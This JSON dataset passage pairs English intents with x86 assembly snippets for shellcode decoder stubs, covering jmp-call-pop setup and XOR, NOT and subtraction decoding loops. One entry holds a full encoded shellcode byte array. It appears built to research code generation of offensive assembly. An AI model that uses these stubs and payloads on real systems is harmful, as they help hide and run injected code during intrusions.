[
  {
    "intent": "_start label",
    "rewritten_intent": "_start label",
    "snippet": "_start:",
    "slot_map": {
      "_start": "var0"
    },
    "intent_tokens": [
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "_start",
    "rewritten_intent": "_start",
    "snippet": "_start:",
    "slot_map": {
      "_start": "var0"
    },
    "intent_tokens": [
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _start label and jump short to the call_decoder",
    "rewritten_intent": "define the _start label and jump short to the call_decoder",
    "snippet": "_start: \\n jmp call_decoder",
    "slot_map": {
      "call_decoder": "var1",
      "_start": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label",
      "and",
      "jump",
      "short",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "var1"
    ]
  },
  {
    "intent": "define the _start label and jump to the call_decoder",
    "rewritten_intent": "define the _start label and jump to the call_decoder",
    "snippet": "_start: \\n jmp call_decoder",
    "slot_map": {
      "call_decoder": "var1",
      "_start": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label",
      "and",
      "jump",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "var1"
    ]
  },
  {
    "intent": "define the _start label and jump to call_decoder",
    "rewritten_intent": "define the _start label and jump to call_decoder",
    "snippet": "_start: \\n jmp call_decoder",
    "slot_map": {
      "call_decoder": "var1",
      "_start": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label",
      "and",
      "jump",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "var1"
    ]
  },
  {
    "intent": "define the _start label and jump short to the call_decoder",
    "rewritten_intent": "define the _start label and jump short to the call_decoder",
    "snippet": "_start: \\n jmp short call_decoder",
    "slot_map": {
      "call_decoder": "var1",
      "_start": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label",
      "and",
      "jump",
      "short",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "short",
      "var1"
    ]
  },
  {
    "intent": "define the _start label and jump short to call_decoder",
    "rewritten_intent": "define the _start label and jump short to call_decoder",
    "snippet": "_start: \\n jmp short call_decoder",
    "slot_map": {
      "call_decoder": "var1",
      "_start": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label",
      "and",
      "jump",
      "short",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "short",
      "var1"
    ]
  },
  {
    "intent": "define the _start label and jump short to the call_shellcode",
    "rewritten_intent": "define the _start label and jump short to the call_shellcode",
    "snippet": "_start: \\n jmp short call_shellcode",
    "slot_map": {
      "call_shellcode": "var1",
      "_start": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label",
      "and",
      "jump",
      "short",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "short",
      "var1"
    ]
  },
  {
    "intent": "define the _start label and jump short to call_shellcode",
    "rewritten_intent": "define the _start label and jump short to call_shellcode",
    "snippet": "_start: \\n jmp short call_shellcode",
    "slot_map": {
      "call_shellcode": "var1",
      "_start": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label",
      "and",
      "jump",
      "short",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "short",
      "var1"
    ]
  },
  {
    "intent": "define the _start label and jump short to call_shellcode label",
    "rewritten_intent": "define the _start label and jump short to call_shellcode label",
    "snippet": "_start: \\n jmp short call_shellcode",
    "slot_map": {
      "call_shellcode": "var1",
      "_start": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label",
      "and",
      "jump",
      "short",
      "var1",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "short",
      "var1"
    ]
  },
  {
    "intent": "define the _start label and jump short to enc",
    "rewritten_intent": "define the _start label and jump short to enc",
    "snippet": "_start: \\n jmp short enc",
    "slot_map": {
      "_start": "var0",
      "enc": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label",
      "and",
      "jump",
      "short",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "short",
      "var1"
    ]
  },
  {
    "intent": "define the _start label and jump short to stage",
    "rewritten_intent": "define the _start label and jump short to stage",
    "snippet": "_start: \\n jmp short stage",
    "slot_map": {
      "_start": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label",
      "and",
      "jump",
      "short",
      "stage"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "short",
      "stage"
    ]
  },
  {
    "intent": "add 0x2 to al",
    "rewritten_intent": "add 0x2 to al",
    "snippet": "add al, 0x2",
    "slot_map": {
      "0x2": "var0"
    },
    "intent_tokens": [
      "add",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "add",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 3 to al",
    "rewritten_intent": "add 3 to al",
    "snippet": "add al, 3",
    "slot_map": {},
    "intent_tokens": [
      "add",
      "3",
      "al"
    ],
    "snippet_tokens": [
      "add",
      "al",
      ",",
      "3"
    ]
  },
  {
    "intent": "add 0x02 to the current byte in esi",
    "rewritten_intent": "add 0x02 to the current byte in esi",
    "snippet": "add byte [esi], 0x02",
    "slot_map": {
      "0x02": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "current",
      "byte",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x10 to the current byte in esi",
    "rewritten_intent": "add 0x10 to the current byte in esi",
    "snippet": "add byte [esi], 0x10",
    "slot_map": {
      "0x10": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "current",
      "byte",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 4 to eax and jump to decode if the result is not zero",
    "rewritten_intent": "add 4 to eax and jump to decode if the result is not zero",
    "snippet": "add eax, 4 \\n jnz decode",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "add",
      "4",
      "var0",
      "and",
      "jump",
      "decode",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "4",
      "\\n",
      "jnz",
      "decode"
    ]
  },
  {
    "intent": "add the value on ebx to eax",
    "rewritten_intent": "add the value on ebx to eax",
    "snippet": "add eax, ebx",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "add",
      "value",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x2 to ebp",
    "rewritten_intent": "add 0x2 to ebp",
    "snippet": "add ebp, 0x2",
    "slot_map": {
      "0x2": "var0",
      "ebp": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 2 to edi",
    "rewritten_intent": "add 2 to edi",
    "snippet": "add edi, 2",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "add",
      "2",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "add 2 to the contents of esi",
    "rewritten_intent": "add 2 to the contents of esi",
    "snippet": "add esi, 2",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "add",
      "2",
      "contents",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "call the decoder function",
    "rewritten_intent": "call the decoder function",
    "snippet": "call decoder",
    "slot_map": {
      "decoder": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call decoder",
    "rewritten_intent": "call decoder",
    "snippet": "call decoder",
    "slot_map": {},
    "intent_tokens": [
      "call",
      "decoder"
    ],
    "snippet_tokens": [
      "call",
      "decoder"
    ]
  },
  {
    "intent": "call decoder_setup",
    "rewritten_intent": "call decoder_setup",
    "snippet": "call decoder_setup",
    "slot_map": {
      "decoder_setup": "var0"
    },
    "intent_tokens": [
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call returnlabel",
    "rewritten_intent": "call returnlabel",
    "snippet": "call returnlabel",
    "slot_map": {
      "returnlabel": "var0"
    },
    "intent_tokens": [
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "define call_decoded and execute it",
    "rewritten_intent": "define call_decoded and execute it",
    "snippet": "call_decoded: \\n call [esp]",
    "slot_map": {
      "call_decoded": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "and",
      "execute",
      "it"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "define call_decoder",
    "rewritten_intent": "define call_decoder",
    "snippet": "call_decoder:",
    "slot_map": {
      "call_decoder": "var0"
    },
    "intent_tokens": [
      "define",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "call_decoder label",
    "rewritten_intent": "call_decoder label",
    "snippet": "call_decoder:",
    "slot_map": {
      "call_decoder": "var0"
    },
    "intent_tokens": [
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define call_decoder and call decoder function",
    "rewritten_intent": "define call_decoder and call decoder function",
    "snippet": "call_decoder: \\n call decoder",
    "slot_map": {
      "call_decoder": "var0",
      "decoder": "var2"
    },
    "intent_tokens": [
      "define",
      "var0",
      "and",
      "call",
      "var2",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "var2"
    ]
  },
  {
    "intent": "define the call_decoder label and call the decoder function",
    "rewritten_intent": "define the call_decoder label and call the decoder function",
    "snippet": "call_decoder: \\n call decoder",
    "slot_map": {
      "call_decoder": "var0",
      "decoder": "var2"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label",
      "and",
      "call",
      "var2",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "var2"
    ]
  },
  {
    "intent": "define call_decoder and call decoder",
    "rewritten_intent": "define call_decoder and call decoder",
    "snippet": "call_decoder: \\n call decoder",
    "slot_map": {
      "call_decoder": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "and",
      "call",
      "decoder"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "decoder"
    ]
  },
  {
    "intent": "in the function call_decoder call the decoder routine and define shellcode as array of bytes 0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87",
    "rewritten_intent": "in the function call_decoder call the decoder routine and define shellcode as array of bytes 0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87",
    "snippet": "call_decoder: \\n call decoder \\n shellcode: db 0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87",
    "slot_map": {
      "call_decoder": "var0",
      "decoder": "var2",
      "0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87": "var3"
    },
    "intent_tokens": [
      "in",
      "function",
      "var0",
      "call",
      "var2",
      "routine",
      "and",
      "define",
      "shellcode",
      "array",
      "bytes",
      "var3"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "var2",
      "\\n",
      "shellcode",
      ":",
      "db",
      "var3"
    ]
  },
  {
    "intent": "call_shellcode function",
    "rewritten_intent": "call_shellcode function",
    "snippet": "call_shellcode:",
    "slot_map": {
      "call_shellcode": "var0"
    },
    "intent_tokens": [
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "call_shellcode routine",
    "rewritten_intent": "call_shellcode routine",
    "snippet": "call_shellcode:",
    "slot_map": {
      "call_shellcode": "var0"
    },
    "intent_tokens": [
      "var0",
      "routine"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the call_shellcode label and call the decoder function",
    "rewritten_intent": "define the call_shellcode label and call the decoder function",
    "snippet": "call_shellcode: \\n call decoder",
    "slot_map": {
      "call_shellcode": "var0",
      "decoder": "var2"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label",
      "and",
      "call",
      "var2",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "var2"
    ]
  },
  {
    "intent": "define the call_shellcode function and call decoder",
    "rewritten_intent": "define the call_shellcode function and call decoder",
    "snippet": "call_shellcode: \\n call decoder",
    "slot_map": {
      "call_shellcode": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function",
      "and",
      "call",
      "decoder"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "decoder"
    ]
  },
  {
    "intent": "define call_shellcode and call decoder function",
    "rewritten_intent": "define call_shellcode and call decoder function",
    "snippet": "call_shellcode: \\n call decoder",
    "slot_map": {
      "call_shellcode": "var0",
      "decoder": "var2"
    },
    "intent_tokens": [
      "define",
      "var0",
      "and",
      "call",
      "var2",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "var2"
    ]
  },
  {
    "intent": "in call_shellcode call the decoder function",
    "rewritten_intent": "in call_shellcode call the decoder function",
    "snippet": "call_shellcode: \\n call decoder",
    "slot_map": {
      "call_shellcode": "var0",
      "decoder": "var2"
    },
    "intent_tokens": [
      "in",
      "var0",
      "call",
      "var2",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "var2"
    ]
  },
  {
    "intent": "in call_shellcode execute the decoder routine",
    "rewritten_intent": "in call_shellcode execute the decoder routine",
    "snippet": "call_shellcode: \\n call decoder",
    "slot_map": {
      "call_shellcode": "var0",
      "decoder": "var2"
    },
    "intent_tokens": [
      "in",
      "var0",
      "execute",
      "var2",
      "routine"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "var2"
    ]
  },
  {
    "intent": "define check_even_odd",
    "rewritten_intent": "define check_even_odd",
    "snippet": "check_even_odd:",
    "slot_map": {
      "check_even_odd": "var0"
    },
    "intent_tokens": [
      "define",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "jump short to decode if al is not equal to cl else jump to shellcode",
    "rewritten_intent": "jump short to decode if al is not equal to cl else jump to shellcode",
    "snippet": "cmp al, cl \\n jnz short decode \\n jmp shellcode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "decode",
      "if",
      "al",
      "not",
      "equal",
      "cl",
      "else",
      "jump",
      "shellcode"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "cl",
      "\\n",
      "jnz",
      "short",
      "decode",
      "\\n",
      "jmp",
      "shellcode"
    ]
  },
  {
    "intent": "jump to shellcode if bl is equal to 0xaa",
    "rewritten_intent": "jump to shellcode if bl is equal to 0xaa",
    "snippet": "cmp bl, 0xaa \\n jz shellcode",
    "slot_map": {
      "0xaa": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "jump",
      "shellcode",
      "if",
      "var0",
      "equal",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "jz",
      "shellcode"
    ]
  },
  {
    "intent": "jump to xordecode if bl is equal to 0xbb else jump to notdecode",
    "rewritten_intent": "jump to xordecode if bl is equal to 0xbb else jump to notdecode",
    "snippet": "cmp bl, 0xbb \\n jz xordecode \\n jmp notdecode",
    "slot_map": {
      "0xbb": "var2",
      "xordecode": "var0",
      "bl": "var1",
      "notdecode": "var3"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "var1",
      "equal",
      "var2",
      "else",
      "jump",
      "var3"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var2",
      "\\n",
      "jz",
      "var0",
      "\\n",
      "jmp",
      "var3"
    ]
  },
  {
    "intent": "jump to shellcode label if the byte in esi is equal to 0x88",
    "rewritten_intent": "jump to shellcode label if the byte in esi is equal to 0x88",
    "snippet": "cmp byte [esi], 0x88 \\n jz shellcode",
    "slot_map": {
      "0x88": "var1",
      "esi": "var0"
    },
    "intent_tokens": [
      "jump",
      "shellcode",
      "label",
      "if",
      "byte",
      "var0",
      "equal",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "var1",
      "\\n",
      "jz",
      "shellcode"
    ]
  },
  {
    "intent": "jump to not_equal if the current byte of the shellcode is not equal to bl",
    "rewritten_intent": "jump to not_equal if the current byte of the shellcode is not equal to bl",
    "snippet": "cmp byte [esi], bl \\n jne not_equal",
    "slot_map": {
      "not_equal": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "current",
      "byte",
      "shellcode",
      "not",
      "equal",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "byte",
      "[",
      "esi",
      "]",
      ",",
      "var1",
      "\\n",
      "jne",
      "var0"
    ]
  },
  {
    "intent": "jump to execute_shellcode if the doubleword in esi+edx+5 is equal to edi",
    "rewritten_intent": "jump to execute_shellcode if the doubleword in esi+edx+5 is equal to edi",
    "snippet": "cmp dword [esi + edx + 5], edi \\n jz execute_shellcode",
    "slot_map": {
      "execute_shellcode": "var0",
      "esi+edx+5": "var2",
      "edi": "var3"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "doubleword",
      "var2",
      "equal",
      "var3"
    ],
    "snippet_tokens": [
      "cmp",
      "dword",
      "[",
      "esi",
      "+",
      "edx",
      "+",
      "5",
      "]",
      ",",
      "var3",
      "\\n",
      "jz",
      "var0"
    ]
  },
  {
    "intent": "in common_commands point to the next byte in esi",
    "rewritten_intent": "in common_commands point to the next byte in esi",
    "snippet": "common_commands: \\n inc esi",
    "slot_map": {
      "common_commands": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "in",
      "var0",
      "point",
      "next",
      "byte",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "inc",
      "var1"
    ]
  },
  {
    "intent": "define cycle",
    "rewritten_intent": "define cycle",
    "snippet": "cycle:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "cycle"
    ],
    "snippet_tokens": [
      "cycle",
      ":"
    ]
  },
  {
    "intent": "decrement the al register and jump to shellcode if the result is zero",
    "rewritten_intent": "decrement the al register and jump to shellcode if the result is zero",
    "snippet": "dec al \\n jz shellcode",
    "slot_map": {},
    "intent_tokens": [
      "decrement",
      "al",
      "register",
      "and",
      "jump",
      "shellcode",
      "if",
      "result",
      "zero"
    ],
    "snippet_tokens": [
      "dec",
      "al",
      "\\n",
      "jz",
      "shellcode"
    ]
  },
  {
    "intent": "decrease ebx by 1",
    "rewritten_intent": "decrease ebx by 1",
    "snippet": "dec ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "decrease",
      "var0",
      "1"
    ],
    "snippet_tokens": [
      "dec",
      "var0"
    ]
  },
  {
    "intent": "decode_loop",
    "rewritten_intent": "decode_loop",
    "snippet": "decode_loop:",
    "slot_map": {
      "decode_loop": "var0"
    },
    "intent_tokens": [
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "decode_pr function",
    "rewritten_intent": "decode_pr function",
    "snippet": "decode_pr:",
    "slot_map": {
      "decode_pr": "var0"
    },
    "intent_tokens": [
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the decode label",
    "rewritten_intent": "define the decode label",
    "snippet": "decode:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "decode",
      "label"
    ],
    "snippet_tokens": [
      "decode",
      ":"
    ]
  },
  {
    "intent": "function decode",
    "rewritten_intent": "function decode",
    "snippet": "decode:",
    "slot_map": {},
    "intent_tokens": [
      "function",
      "decode"
    ],
    "snippet_tokens": [
      "decode",
      ":"
    ]
  },
  {
    "intent": "decode function",
    "rewritten_intent": "decode function",
    "snippet": "decode:",
    "slot_map": {
      "decode": "var0"
    },
    "intent_tokens": [
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "decode routine",
    "rewritten_intent": "decode routine",
    "snippet": "decode:",
    "slot_map": {
      "decode": "var0"
    },
    "intent_tokens": [
      "var0",
      "routine"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "decode label",
    "rewritten_intent": "decode label",
    "snippet": "decode:",
    "slot_map": {},
    "intent_tokens": [
      "decode",
      "label"
    ],
    "snippet_tokens": [
      "decode",
      ":"
    ]
  },
  {
    "intent": "in the decode function jump to lowbound label if the current byte of the shellcode is lower than 0x7 else subtract 0x7 from the byte of the shellcode and jump to common_commands",
    "rewritten_intent": "in the decode function jump to lowbound label if the current byte of the shellcode is lower than 0x7 else subtract 0x7 from the byte of the shellcode and jump to common_commands",
    "snippet": "decode: \\n cmp byte [esi], 0x7 \\n jl lowbound \\n sub byte [esi], 0x7 \\n jmp common_commands",
    "slot_map": {
      "common_commands": "var5",
      "decode": "var0",
      "0x7": "var2",
      "lowbound": "var1"
    },
    "intent_tokens": [
      "in",
      "var0",
      "function",
      "jump",
      "var1",
      "label",
      "if",
      "current",
      "byte",
      "shellcode",
      "lower",
      "var2",
      "else",
      "subtract",
      "var2",
      "byte",
      "shellcode",
      "and",
      "jump",
      "var5"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "cmp",
      "byte",
      "[",
      "esi",
      "]",
      ",",
      "var2",
      "\\n",
      "jl",
      "var1",
      "\\n",
      "sub",
      "byte",
      "[",
      "esi",
      "]",
      ",",
      "var2",
      "\\n",
      "jmp",
      "var5"
    ]
  },
  {
    "intent": "in decode move the current byte of the shellcode in the bl register",
    "rewritten_intent": "in decode move the current byte of the shellcode in the bl register",
    "snippet": "decode: \\n mov bl, byte [esi]",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "in",
      "decode",
      "move",
      "current",
      "byte",
      "shellcode",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "decode",
      ":",
      "\\n",
      "mov",
      "var0",
      ",",
      "byte",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "define the decode function and negate the byte in esi",
    "rewritten_intent": "define the decode function and negate the byte in esi",
    "snippet": "decode: \\n not byte [esi]",
    "slot_map": {
      "decode": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function",
      "and",
      "negate",
      "byte",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "not",
      "byte",
      "[",
      "var1",
      "]"
    ]
  },
  {
    "intent": "define decode function and subtract 13 from the current byte of the shellcode",
    "rewritten_intent": "define decode function and subtract 13 from the current byte of the shellcode",
    "snippet": "decode: \\n sub byte [esi], 13",
    "slot_map": {
      "decode": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function",
      "and",
      "subtract",
      "13",
      "current",
      "byte",
      "shellcode"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "sub",
      "byte",
      "[",
      "esi",
      "]",
      ",",
      "13"
    ]
  },
  {
    "intent": "define the decode function and perform the xor operation between the byte in esi and the 0xaa value",
    "rewritten_intent": "define the decode function and perform the xor operation between the byte in esi and the 0xaa value",
    "snippet": "decode: \\n xor byte [esi], 0xaa",
    "slot_map": {
      "decode": "var0",
      "0xaa": "var2",
      "esi": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function",
      "and",
      "perform",
      "xor",
      "operation",
      "byte",
      "var1",
      "and",
      "var2",
      "value"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "xor",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var2"
    ]
  },
  {
    "intent": "declare the decoded_shellcode label and call the stack",
    "rewritten_intent": "declare the decoded_shellcode label and call the stack",
    "snippet": "decoded_shellcode: \\n call [esp]",
    "slot_map": {
      "decoded_shellcode": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label",
      "and",
      "call",
      "stack"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "decoder_setup label",
    "rewritten_intent": "decoder_setup label",
    "snippet": "decoder_setup:",
    "slot_map": {
      "decoder_setup": "var0"
    },
    "intent_tokens": [
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the decoder function",
    "rewritten_intent": "define the decoder function",
    "snippet": "decoder:",
    "slot_map": {
      "decoder": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "decoder function",
    "rewritten_intent": "decoder function",
    "snippet": "decoder:",
    "slot_map": {
      "decoder": "var0"
    },
    "intent_tokens": [
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "decoder routine",
    "rewritten_intent": "decoder routine",
    "snippet": "decoder:",
    "slot_map": {
      "decoder": "var0"
    },
    "intent_tokens": [
      "var0",
      "routine"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the label decoder",
    "rewritten_intent": "declare the label decoder",
    "snippet": "decoder:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "label",
      "decoder"
    ],
    "snippet_tokens": [
      "decoder",
      ":"
    ]
  },
  {
    "intent": "define decoder",
    "rewritten_intent": "define decoder",
    "snippet": "decoder:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "decoder"
    ],
    "snippet_tokens": [
      "decoder",
      ":"
    ]
  },
  {
    "intent": "decoder's main",
    "rewritten_intent": "decoder's main",
    "snippet": "decoder:",
    "slot_map": {
      "'s": "var0"
    },
    "intent_tokens": [
      "decoder",
      "'s",
      "main"
    ],
    "snippet_tokens": [
      "decoder",
      ":"
    ]
  },
  {
    "intent": "decoder label",
    "rewritten_intent": "decoder label",
    "snippet": "decoder:",
    "slot_map": {},
    "intent_tokens": [
      "decoder",
      "label"
    ],
    "snippet_tokens": [
      "decoder",
      ":"
    ]
  },
  {
    "intent": "define the decoder function and store the encoded shellcode pointer in the esi register",
    "rewritten_intent": "define the decoder function and store the encoded shellcode pointer in the esi register",
    "snippet": "decoder: \\n pop esi",
    "slot_map": {
      "decoder": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function",
      "and",
      "store",
      "encoded",
      "shellcode",
      "pointer",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "in the decoder routine save the shellcode in esi",
    "rewritten_intent": "in the decoder routine save the shellcode in esi",
    "snippet": "decoder: \\n pop esi",
